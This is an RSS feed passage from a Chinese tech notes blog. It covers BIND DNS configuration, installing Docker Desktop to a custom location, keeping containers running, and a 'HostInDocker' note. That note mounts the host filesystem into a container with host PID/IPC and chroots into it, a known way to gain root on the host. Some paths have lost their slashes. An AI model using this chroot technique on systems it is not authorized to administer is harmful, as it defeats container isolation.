<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">options</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    listen-on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> port</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 53</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 192.168.111.254</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">127.0.0.1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; };  </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">//监听端口修改为某一网卡地址，和回环地址。</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    listen-on-v6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> port</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 53</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ::1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; };</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    directory</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   "/var/named"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    dump-file</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   "/var/named/data/cache_dump.db"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    statistics-file</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "/var/named/data/named_stats.txt"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    memstatistics-file</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "/var/named/data/named_mem_stats.txt"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    allow-query</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     {</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 192.168.111.0/24</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; }; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">//查询范围只允许192.168.111.0网段查询。</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    recursion</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> yes</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    dnssec-enable</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> no</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;  </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">//关闭dnssec</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    dnssec-validation</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> no</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;  </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">//关闭dnssec</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    bindkeys-file</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "/etc/named.iscdlv.key"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    managed-keys-directory</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "/var/named/dynamic"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    pid-file</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "/run/named/named.pid"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    session-keyfile</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "/run/named/session.key"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">};</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">logging</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        channel</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default_debug</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">                file</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "data/named.run"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">                severity</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dynamic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        };</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">};</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">zone</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "."</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">    type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hint</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    file</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "named.ca"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">};</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">include</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "/etc/named.rfc1912.zones"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">include</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "/etc/named.root.key"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>配置解析库文件（Zone files）,一般是在/var/named下写，文件名格式一般写为ZONE_NAME.zone</p>
<p>| named.conf配置文件所有的配置语句 | 含义 |
|</p>
]]></content:encoded>
    </item>
    <item>
      <title>Docker Desktop 安装到其他位置</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%20Desktop%E5%AE%89%E8%A3%85%E5%88%B0%E5%85%B6%E4%BB%96%E4%BD%8D%E7%BD%AE.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/Docker%20Desktop%E5%AE%89%E8%A3%85%E5%88%B0%E5%85%B6%E4%BB%96%E4%BD%8D%E7%BD%AE.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker Desktop 安装到其他位置</source>
      <description>Docker Desktop 安装到其他位置 本文档将指导您如何在 Windows 系统上将 Docker Desktop 安装到非默认位置，并配置其数据根目录。 官方文档 参考官方文档：https://docs.docker.com/desktop/setup/install/windows-install/#data-root-and-disk-l...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<p>本文档将指导您如何在 Windows 系统上将 Docker Desktop 安装到非默认位置，并配置其数据根目录。</p>
<h2>官方文档</h2>
<p>参考官方文档：<a href="https://docs.docker.com/desktop/setup/install/windows-install/#data-root-and-disk-location" target="_blank" rel="noopener noreferrer"><code>https://docs.docker.com/desktop/setup/install/windows-install/#data-root-and-disk-location</code></a></p>
<h2>安装命令</h2>
<p>以下命令演示了如何将 Docker Desktop 安装到指定位置，并将 Hyper-V、Windows 容器和 WSL 的数据根目录也配置到指定位置。</p>
<p><strong>请提前创建数据目录</strong></p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"Docker Desktop Installer.exe"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --installation-dir=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Z:\Docker"</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hyper-v-default-data-root=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Z:\Docker\hyperv"</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --windows-containers-default-data-root=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Z:\Docker\windowscontainer"</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --wsl-default-data-root=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Z:\Docker\wsl-data"</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>命令参数说明</h2>
<ul>
<li><code>--installation-dir="Z:\Docker"</code>: 指定 Docker Desktop 的安装路径。</li>
<li><code>--hyper-v-default-data-root="Z:\Docker\hyperv"</code>: 指定 Hyper-V 虚拟机的默认数据根目录。</li>
<li><code>--windows-containers-default-data-root="Z:\Docker\windowscontainer"</code>: 指定 Windows 容器的默认数据根目录。</li>
<li><code>--wsl-default-data-root="Z:\Docker\wsl-data"</code>: 指定 WSL 2 的默认数据根目录。</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>Docker不死进程</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%E4%B8%8D%E6%AD%BB%E8%BF%9B%E7%A8%8B.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/Docker%E4%B8%8D%E6%AD%BB%E8%BF%9B%E7%A8%8B.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker不死进程</source>
      <description>Docker不死进程 问题描述 执行docker run image-id bash后，容器退出 解决方法 docker容器的主线程（dockfile中CMD执行的命令）结束，容器会退出 有以下几种解决方法： 使主进程无法结束 使用交互式启动 使用后台模式和tty选项</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>问题描述</h2>
<p>执行docker run image-id bash后，容器退出</p>
<h2>解决方法</h2>
<p>docker容器的主线程（dockfile中CMD执行的命令）结束，容器会退出</p>
<p>有以下几种解决方法：</p>
<p>使主进程无法结束</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> centos</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /bin/bash</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -c</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "while true;do echo hello docker;sleep 1;done"</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>使用交互式启动</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -i</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [CONTAINER_NAME </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">or</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> CONTAINER_ID]</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>使用后台模式和tty选项</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -dit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [CONTAINER_NAME </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">or</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> CONTAINER_ID]</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Docker学习笔记PDF</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0PDF.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0PDF.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker学习笔记PDF</source>
      <description>Docker学习笔记PDF</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
]]></content:encoded>
    </item>
    <item>
      <title>Docker实现HostInDocker</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%E5%AE%9E%E7%8E%B0HostInDocker.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/Docker%E5%AE%9E%E7%8E%B0HostInDocker.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker实现HostInDocker</source>
      <description>Docker实现HostInDocker 先记录过程，有空再写</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<p>先记录过程，有空再写</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@aaa-ai~#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -it</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --ipc=host</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --pid=host</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ubuntu</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bash</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@bedd413c7d54#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> chroot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bash</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@bedd413c7d54#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ps</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">CONTAINER</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ID</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   IMAGE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     COMMAND</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   CREATED</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">          STATUS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">          PORTS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     NAMES</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bedd413c7d54</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   ubuntu</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    bash</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> seconds</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ago</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   Up</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 17</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> seconds</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">             angry_spence</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@bedd413c7d54#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">●</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx.service</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> high</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> performance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> web</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> server</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> and</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> reverse</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> proxy</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> server</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">     Loaded</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> loaded</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (libsystemdsystemnginx.service; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">enabled</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vendor</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preset</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> enabled</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">     Active</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> active</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (running) since Wed 2024-04-17 152345 CST; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">6min</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ago</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       Docs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mannginx</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">8</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    Process</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 194847</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ExecStartPre=usrsbinnginx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -t</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -q</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -g</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> daemon</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">master_process</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; (</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">code</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">exited,</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> status</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">0SUCCESS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    Process</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 194848</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ExecStart=usrsbinnginx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -g</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> daemon</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">master_process</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; (</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">code</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">exited,</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> status</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">0SUCCESS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   Main</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> PID</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 194849</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (nginx)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      Tasks</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 17</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (limit </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">38341</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">     Memory</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 13.8M</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        CPU</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 43ms</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">     CGroup</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> system.slicenginx.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194849</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> master</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> usrsbinnginx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -g</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> daemon</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">master_process</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194850</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194851</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194852</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194853</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194854</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194855</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194856</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194857</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
